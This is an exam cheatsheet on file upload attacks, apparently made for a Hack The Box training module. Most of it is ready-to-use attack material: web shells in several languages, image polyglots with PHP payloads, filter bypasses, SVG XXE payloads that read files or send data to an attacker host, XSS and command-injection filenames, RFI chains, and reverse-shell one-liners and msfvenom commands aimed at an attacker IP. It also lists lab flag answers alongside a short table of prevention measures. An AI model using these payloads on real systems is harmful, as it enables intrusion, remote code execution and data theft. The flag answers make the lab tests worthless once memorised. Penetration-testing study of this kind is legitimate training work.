# File Upload Attacks — Exam Cheatsheet

---

## Detection

```bash
# Find upload form
curl -sk "http://TARGET/" | grep -iE 'enctype|type="file"|accept='

# Check what client-side restricts (UX hint, not security)
# Inspect form: action= endpoint, name= field name, accept= types
```
> Scans the page for file upload forms. Look at `action=` for the upload endpoint and `name=` for the field name to use in curl `-F`.

---

## Quick Bypass by Filter Type

| Filter | Bypass |
|--------|--------|
| **Client-side only** | curl direct POST: `curl -X POST URL -F "field=@shell.php"` |
| **Blacklist (`.php`)** | `.phar`, `.phtml`, `.pht`, `.php5`, case variants (`.pHp`) |
| **Whitelist (contains image ext)** | Double extension: `shell.jpg.phar` |
| **Whitelist (`$`-anchored)** | Reverse double: `shell.phar.jpg` (if Apache regex loose) |
| **Content-Type header** | `-F "field=@shell.php;type=image/jpeg"` |
| **MIME magic bytes** | Polyglot: `GIF8<?php ... ?>` or real JPEG header + PHP |
| **All five combined** | `shell.jpg.phar` with `GIF8`/JPEG content + `image/jpeg` Content-Type |

---

## Web Shells (one-liners)

```php
// PHP — universal
<?php system($_REQUEST['cmd']); ?>

// PHP alt sinks (if system disabled)
<?php passthru($_GET['c']); ?>
<?php echo shell_exec($_GET['c']); ?>
<?php echo `{$_GET['c']}`; ?>
```
> `$_REQUEST` catches both GET and POST. If `system()` is blocked by `disable_functions`, try the alternates in order.

```asp
<% eval request('cmd') %>
```
> One-liner web shell for classic ASP. Works on older IIS servers (Windows).

```jsp
<% Runtime.getRuntime().exec(request.getParameter("cmd")); %>
```
> Java Server Pages (JSP) web shell for Apache Tomcat targets.

```python
# Flask
__import__('os').system(request.args.get('cmd'))
```
> Flask/Python web shell. Use when the app is Python-based and accepts `.py` templates.

---

## Magic Bytes

| Format | Header (inline-friendly) |
|--------|--------------------------|
| GIF | `GIF8` (ASCII, easiest) |
| JPEG | `\xff\xd8\xff\xe0\x00\x10JFIF` |
| PNG | `\x89PNG\r\n\x1a\n` |
| PDF | `%PDF-1.4` |
| ZIP | `PK\x03\x04` |

```bash
# Polyglot file build
printf 'GIF8<?php system($_REQUEST["c"]); ?>' > poly.jpg
# Or with real JPEG header:
printf '\xff\xd8\xff\xe0\x00\x10JFIF\x00\x01\x01\x00\x00\x01\x00\x01\x00\x00\xff\xdb<?php system($_REQUEST["c"]); ?>' > poly.jpg

file poly.jpg   # confirm MIME = image/*
```
> Creates a polyglot file — image magic bytes followed by PHP code. `file` confirms it reads as an image. PHP ignores the header bytes and executes the `<?php` block.

---

## PHP Extension Variants (try in order)

```
.php   .phtml   .php5   .phps   .php7        ← usually blacklisted
.phar  .pht     .php2   .php3   .php4        ← often allowed
.phpt  .inc                                   ← rarely allowed but executes
.pHp   .PhP    .PHP                          ← case bypass (Windows / case-bug)
```

---

## Common Upload Endpoints + Storage Paths

```
/upload.php      /upload     /api/upload     /api/file
/uploads/        /upload/    /files/         /attachments/
/profile_images/ /avatars/   /images/        /media/
/user_uploads/   /storage/   /assets/
```

Fuzz storage:
```bash
for d in uploads upload files images media profile_images avatars; do
  curl -sk -o /dev/null -w "%{http_code} /$d/\n" "http://TARGET/$d/"
done
```
> Probes common upload storage directories. A 200 or 403 means the directory exists. A 404 means it doesn't.

---

## SVG Attacks (Limited Upload Bypass)

### XXE — Local File Read
```xml
<?xml version="1.0"?>
<!DOCTYPE svg [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<svg xmlns="http://www.w3.org/2000/svg">&xxe;</svg>
```
> Reads a local file via XML External Entity (XXE) injection. The server parses the SVG, resolves `&xxe;` to the file contents, and returns it in the rendered output.

### XXE — PHP Source Disclosure
```xml
<?xml version="1.0"?>
<!DOCTYPE svg [ <!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=upload.php"> ]>
<svg xmlns="http://www.w3.org/2000/svg">&xxe;</svg>
```
> Reads PHP source code as base64 so it survives XML parsing. Decode the output with `base64 -d` to see the raw PHP.

### Stored XSS via SVG
```xml
<svg xmlns="http://www.w3.org/2000/svg">
  <script>alert(document.cookie)</script>
</svg>
```
> Delivers stored cross-site scripting (XSS) via SVG upload. Any user who views the SVG in the browser runs the script in the site's origin.

### Out-of-Band XXE (when not reflected)
```xml
<?xml version="1.0"?>
<!DOCTYPE svg [
  <!ENTITY % file SYSTEM "file:///etc/passwd">
  <!ENTITY % dtd SYSTEM "http://ATTACKER/evil.dtd">
  %dtd;
]>
<svg xmlns="http://www.w3.org/2000/svg">&exfil;</svg>
```
> Out-of-band XXE exfiltrates data to your server when the response doesn't show the entity value directly. Requires an `evil.dtd` file hosted on your attacker machine.

---

## XSS via Image EXIF

```bash
exiftool -Comment='"><img src=1 onerror=alert(document.cookie)>' photo.jpg
exiftool -Artist='<script>alert(1)</script>' photo.jpg
```
> Embeds a cross-site scripting (XSS) payload into the image metadata. Fires when any page renders the Comment or Artist field in HTML without escaping it.

Fires when the metadata is rendered on a viewer page.

---

## Filename Injection Payloads

```bash
# Command injection
file$(whoami).jpg
file`whoami`.jpg
file.jpg||whoami

# Path traversal
../../../etc/cron.d/x
../../../var/www/html/.htaccess

# SQLi
file';SELECT+SLEEP(5);--.jpg

# XSS (filename displayed)
<script>alert(1)</script>.jpg

# Windows reserved
CON.jpg  NUL.png  PRN.jpg
LPT1.gif COM1.png
```
> These payloads target servers that use the filename unsafely — in shell commands, SQL queries, or HTML output. Pick based on what the server does with the name after upload.

---

## RFI (when LFI + upload chains)

```bash
# Host PHP shell on attacker
echo '<?php system($_GET["c"]); ?>' > /tmp/shell.php
cd /tmp && python3 -m http.server 8888

# RFI trigger (depends on LFI sink)
curl "http://TARGET/?p=http://ATTACKER:8888/shell.php&c=id"

# SMB (Windows targets — no allow_url_include needed)
impacket-smbserver -smb2support share /tmp
curl "http://TARGET/?p=\\\\ATTACKER\\share\\shell.php"
```
> Hosts a shell on your machine and uses a Remote File Inclusion (RFI) bug to load it into the target. SMB works on Windows even without `allow_url_include` enabled.

---

## Generate Reverse Shells

```bash
# pentestmonkey (Kali built-in)
cp /usr/share/webshells/php/php-reverse-shell.php /tmp/rev.php
sed -i "s/127.0.0.1/10.10.17.176/; s/1234/4444/" /tmp/rev.php

# msfvenom — PHP / JSP / ASPX
msfvenom -p php/reverse_php LHOST=10.10.17.176 LPORT=4444 -f raw > rev.php
msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.17.176 LPORT=4444 -f war > shell.war
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.17.176 LPORT=4444 -f aspx > shell.aspx

# Listener
nc -lvnp 4444    # or rlwrap nc / pwncat-cs
```
> Generates language-specific reverse shells. Replace `10.10.17.176` with your tun0 IP. The `nc -lvnp` listener must be running before you trigger the upload.

---

## Reverse Shell One-Liners (via web shell `?cmd=`)

```bash
# bash
bash -c 'bash -i >& /dev/tcp/10.10.17.176/4444 0>&1'

# python3
python3 -c 'import socket,os,pty;s=socket.socket();s.connect(("10.10.17.176",4444));[os.dup2(s.fileno(),f) for f in (0,1,2)];pty.spawn("bash")'

# nc without -e
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc 10.10.17.176 4444 >/tmp/f
```
> Pass these as the `cmd=` value to a web shell. URL-encode them first with `--data-urlencode` in curl. The netcat (nc) named-pipe version works when nc lacks the `-e` flag.

---

## DoS via Upload

| Attack | Payload |
|--------|---------|
| Zip bomb | Recursively nested ZIPs → petabytes uncompressed |
| Pixel flood | JPG/PNG with header claiming 65535×65535 pixels |
| Overlarge file | Many GB → fill disk |
| XML billion laughs | Nested entity references in SVG/DOCX |
| Decompression bomb | Same as zip bomb but for other compressed formats |

---

## Prevention Reference

| Defense | Stops |
|---------|-------|
| Whitelist with `$` anchor | Double extension |
| Blacklist (incl. `.phar`/`.phtml`/`.pht`) | Reverse-double + alt-extension |
| MIME (magic byte) validation | Wrong Content-Type spoofing |
| **Re-encode image server-side** | All polyglot files (kills the technique) |
| Random filename storage | Filename injection, path disclosure |
| `disable_functions = system,exec,...` | RCE even after upload succeeds |
| `open_basedir` | File system access outside webroot |
| Apache `<FilesMatch>` with `$` anchor | Reverse-double extension RCE |
| `php_flag engine off` in upload dir | All PHP execution in upload location |
| Content-Disposition: attachment | Inline rendering of HTML/SVG |
| X-Content-Type-Options: nosniff | Browser MIME sniffing |

---

## Lab Flag Reference

| Section | Technique | Flag / Answer |
|---------|-----------|---------------|
| 2 — Absent Validation | Direct .php upload + `system("hostname")` | Hostname output |
| 3 — Web shell | `<?php system($_REQUEST["cmd"]); ?>` → `cat /flag.txt` | `HTB{g07_my_f1r57_w3b_5h3ll}` |
| 4 — Client-side | curl direct POST | `HTB{cl13n7_51d3_v4l1d4710n_w0n7_570p_m3}` |
| 5 — Blacklist | `.phar` extension | `HTB{1_c4n_n3v3r_b3_bl4ckl1573d}` |
| 6 — Whitelist | `.phar.jpg` (reverse double) | `HTB{1_wh173l157_my53lf}` |
| 7 — Type filters (5-stack) | `GIF8` + `.jpg.phar` + `image/jpeg` Content-Type | `HTB{m461c4l_c0n73n7_3xpl0174710n}` |
| 8 — Limited (SVG XXE) | `<!ENTITY xxe SYSTEM "file:///flag.txt">` | `HTB{my_1m4635_4r3_l37h4l}` / dir `./images/` |
| 10 — Prevention | `disable_functions` | (no flag — theory) |
| 11 — Skills Assessment | SVG XXE source disclosure → `.phar.jpg` polyglot at `user_feedback_submissions/YYMMDD_*` | `HTB{m4573r1ng_upl04d_3xpl0174710n}` |

---

## Decision Tree When Stuck

```
Plain .php blocked?
  → Try .phar (most reliable bypass) and .phtml
  → Try case variants (.pHp) on case-insensitive FS

Whitelist requires image ext?
  → Double extension: shell.jpg.phar (whitelist contains-based)
  → Reverse double: shell.phar.jpg (Apache handler loose)

Content-Type rejected?
  → Add ;type=image/jpeg in curl -F

MIME magic check rejects?
  → Prepend GIF8 (ASCII) or real JPEG header before <?php

All upload filters strict?
  → Look for SVG acceptance — SVG XXE for read primitive
  → Use XXE to read upload.php source → understand exact filters
  → Craft payload that matches all regex constraints

File uploaded but not executing?
  → Check storage dir is web-accessible
  → Check Apache PHP handler regex (loose = .phar.jpg executes, strict = needs final .php)
  → Try .htaccess upload to re-map handlers

Upload path random/unknown?
  → Read source via SVG XXE
  → Fuzz common upload dirs (/uploads/, /profile_images/, /user_feedback/, etc.)
  → Look for date prefixes (YYMMDD_) or md5(content) naming
```
